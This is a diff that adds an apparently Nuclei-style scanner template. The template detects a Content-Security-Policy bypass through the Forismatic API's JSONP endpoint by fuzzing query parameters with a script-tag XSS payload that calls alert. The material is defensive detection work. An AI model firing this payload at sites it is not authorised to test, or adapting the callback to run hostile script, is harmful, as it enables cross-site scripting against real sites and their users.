@@ -1,0 +1,55 @@
+id: forismatic-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Forismatic API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,forismatic-api,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "forismatic.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: forismatic_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://api.forismatic.com/api/1.0/?format=jsonp&method=getQuote&jsonp=alert&lang=en"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "forismatic_api_csp_xss == true"
+# digest: 4b0a00483046022100b9ca195b0fe3d5cadec6a55e79932b87a3be425820058c609c94352caa74b6ec022100b3abc762bb140d565da9c8872505083b7965cbc8a4044dcf52854c1af8a73de4:922c64590222798bb761d5b6d8e72950
